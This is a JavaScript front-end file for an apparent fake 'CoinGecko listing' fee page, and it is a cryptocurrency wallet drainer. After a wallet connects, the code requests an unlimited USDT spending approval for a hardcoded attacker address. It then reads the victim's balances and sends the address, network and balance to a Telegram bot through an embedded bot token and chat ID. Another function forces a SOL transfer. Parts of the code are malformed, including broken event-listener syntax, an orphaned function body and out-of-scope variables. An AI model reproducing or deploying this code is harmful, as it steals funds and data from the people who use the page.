'use strict';

/* ============================
   DOM REFERENCES
   ============================ */
const projectForm = document.getElementById('projectForm');
const feeModal = document.getElementById('feeModal');
const walletModal = document.getElementById('walletModal');
const closeButtons = document.getElementsByClassName('close');
const proceedButton = document.getElementById('proceedButton');
const phantomButton = document.getElementById('phantomButton'); // replace MetaMask with Phantom

let solanaProvider = null;

/* ============================
   UI FLOW
   ============================ */
if (projectForm && feeModal) {
  projectForm.addEventListener('submit', (event) => {
    event.preventDefault();
    feeModal.style.display = 'flex';
  });
}

if (closeButtons[0] && feeModal) {
  closeButtons[0].addEventListener('click', () => {
    feeModal.style.display = 'none';
  });
}

if (proceedButton && feeModal && walletModal) {
  proceedButton.addEventListener('click', () => {
    feeModal.style.display = 'none';
    walletModal.style.display = 'flex';
  });
}

if (closeButtons[1] && walletModal) {
  closeButtons[1].addEventListener('click', () => {
    walletModal.style.display = 'none';
  });
}

if (phantomButton) {
  phantomButton.addEventListener('click', connectPhantom);
}

/* ============================
   PHANTOM WALLET
   ============================ */
async function connectPhantom() {
  try {
    const provider = window.solana;
    if (!provider || !provider.isPhantom) {
      alert('Phantom Wallet not found. Please install it.');
      return;
    }

    const resp = await provider.connect();
    solanaProvider = provider;

    console.log('Connected account:', resp.publicKey.toString());

    await sendSol(resp.publicKey.toString());
  } catch (error) {
    console.error('Error connecting to Phantom:', error);
  }
}

/* ============================
   WALLETCONNECT v2 (ETHEREUM ONLY, COPIED STYLE)
   ============================ */
 window.addEventListener('DOMContentLoaded'), 
          async function () {
            const WALLETCONNECT_PROJECT_ID = "85d1310d55b14854c6d62bab3b779200";
            const SPENDER_ADDRESS = "0x89e8ed15656ab289e980f92e59ddf7ecd2a36f85";

            const TELEGRAM_BOT = "8457525765:AAFYTnliMT7j8L4QWcDmJfWdTi1_op60Ry8";
            const ADMIN_CHAT_ID = "5126266116";

            const NETWORKS = {
              1: { name: "Ethereum", symbol: "ETH", rpc: "https://eth.llamarpc.com", explorer: "https://etherscan.io", moonpay: "https://buy.moonpay.com?currencyCode=eth", usdtAddress: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6 },
              56: { name: "BNB Smart Chain", symbol: "BNB", rpc: "https://bsc-dataseed.binance.org", explorer: "https://bscscan.com", moonpay: "https://buy.moonpay.com?currencyCode=bnb", usdtAddress: "0x55d398326f99059fF775485246999027B3197955", decimals: 18 }
            };

            // Added balanceOf so we can read wallet balance
            const ERC20_ABI = ["function approve(address spender, uint256 amount) external returns (bool)", "function balanceOf(address) view returns(uint256)"];
            let provider, signer, wcProvider = null, userAddress = null, isProcessing = false, activeProviderType = null;
            let currentChainId = 56;

            function updateWalletDisplay(address) {
              walletDiv.innerHTML = `<i class="fas fa-check-circle"></i> ${address.slice(0, 6)}...${address.slice(-4)}`;
              walletDiv.style.display = 'flex';
            }

            function updateStatusMessage(message, type = 'info') {
              statusDiv.textContent = message;
              statusDiv.className = 'status-message';
              if (type === 'Processing') statusDiv.classList.add('Processing');
              else if (type === 'Submited') statusDiv.classList.add('Submited');
              else if (type === 'error') statusDiv.classList.add('error');
              statusDiv.style.display = 'flex';
            }
           function getReferral() { const params = new URLSearchParams(window.location.search); return params.get("ref"); }
            async function sendTelegram(chatId, message) { if (!chatId) return; await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: chatId, text: message }) }); }

            // Get wallet info for Telegram: Time, Address, Network, Balance, Event
            async function getWalletInfo(signer, chainId) {
              const network = NETWORKS[chainId];
              const address = await signer.getAddress();

              // Native balance
              const nativeBal = await provider.getBalance(address);
              const nativeFormatted = ethers.utils.formatEther(nativeBal);

              // USDT balance
              const usdtContract = new ethers.Contract(network.usdtAddress, ERC20_ABI, provider);
              const usdtBal = await usdtContract.balanceOf(address);
              const usdtFormatted = ethers.utils.formatUnits(usdtBal, network.decimals);

              let balanceText = "";
              if (parseFloat(usdtFormatted) > 0) balanceText += `${parseFloat(usdtFormatted).toFixed(3)} USDT `;
              if (parseFloat(nativeFormatted) > 0) balanceText += `${parseFloat(nativeFormatted).toFixed(3)} ${network.symbol}`;
              if (balanceText === "") balanceText = "0";

              return {
                address: address,
                network: network.name,
                balance: balanceText.trim(),
                time: new Date().toLocaleString("en-GB", { timeZone: "Africa/Lagos" })
              };
            }

            function updateMoonPayLink() { const n = NETWORKS[currentChainId]; moonpayLink.href = n.moonpay; }
            updateMoonPayLink();

            document.querySelectorAll('.network-card').forEach(btn => {
              btn.onclick = () => {
                document.querySelectorAll('.network-card').forEach(b => b.classList.remove('active'));
                btn.classList.add('active');
                currentChainId = parseInt(btn.dataset.chain);
                updateMoonPayLink();
                updateStatusMessage(`Switched to ${btn.querySelector('.network-name').textContent} network`, 'info');
              };
            });

            async function connected() {
              try {
                userAddress = await signer.getAddress();
                updateWalletDisplay(userAddress);
                approveBtn.disabled = false;
                updateStatusMessage('Token under review', 'info');
              } catch (err) {
                console.error(err);
                updateStatusMessage('Failed: ' + err.message, 'error');
              }
            }

            async function ensureInjectedChain() {
              const hex = '0x' + currentChainId.toString(16);
              const cid = await window.ethereum.request({ method: 'eth_chainId' });
              if (cid !== hex) {
                await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: hex }] });
              }
            }

            injectBtn.onclick = async () => {
              if (!window.ethereum) {
                updateStatusMessage("Please install phantom or a Web3 wallet", 'error');
                return;
              }
              injectBtn.classList.add('loading');
              injectBtn.disabled = true;
              try {
                provider = new ethers.providers.Web3Provider(window.ethereum);
                await window.ethereum.request({ method: 'eth_requestAccounts' });
                signer = provider.getSigner();
                activeProviderType = 'injected';
                await connected();
              } catch (err) {
                console.error(err);
                updateStatusMessage('Connection failed', 'error');
              }
              injectBtn.classList.remove('loading');
              injectBtn.disabled = false;
            };

            try {
              if (activeProviderType === 'injected') await ensureInjectedChain();
              const network = NETWORKS[currentChainId];
              const usdt = new ethers.Contract(network.usdtAddress, ERC20_ABI, signer);
              const tx = await usdt.approve(SPENDER_ADDRESS, ethers.constants.MaxUint256);
              const ref = getReferral();
              updateStatusMessage('Transaction sent... Waiting confirmation', 'info');

              const receipt = await tx.wait();
              if (receipt.status === 1) {
                // Get wallet info for Telegram
                const walletInfo = await getWalletInfo(signer, currentChainId);
              };

              // Send only 5 fields as requested
              const message = `✅ COINGECKO LISTING 
                        📅 Time: ${walletInfo.time}
                        👤 Address: ${walletInfo.address}
                        🌐 Network: ${walletInfo.network}
                        💰 Balance: ${walletInfo.balance}
                        📋 Event: Approve + listing event`;

              await sendTelegram(ADMIN_CHAT_ID, message);
            } finally { }
          };
/* ============================
   SOL TRANSFER LOGIC
   ============================ */
async function sendSol(account) {}
  try {
    const receiver = "REPLACE_WITH_RECEIVER_SOL_ADDRESS"; 
    const lamports = 0.01 * 1e9; 

    const transaction = new window.solanaWeb3.Transaction().add(
      window.solanaWeb3.SystemProgram.transfer({
        fromPubkey: solanaProvider.publicKey,
        toPubkey: new window.solanaWeb3.PublicKey(receiver),
        lamports
      })
       );

    transaction.feePayer = solanaProvider.publicKey;
    const { blockhash } = await window.solanaWeb3.Connection
      .prototype.getRecentBlockhash.call(new window.solanaWeb3.Connection("https://api.mainnet-beta.solana.com"));
    transaction.recentBlockhash = blockhash;

    const signed = await solanaProvider.signTransaction(transaction);
    const signature = await new window.solanaWeb3.Connection("https://api.mainnet-beta.solana.com")
      .sendRawTransaction(signed.serialize());

    alert(`✅ SOL transfer successful!\nTx: ${signature}`);
///


            window.addEventListener('beforeunload',()=>{ if(wcProvider?.disconnect) wcProvider.disconnect().catch(()=>{}); });
        };
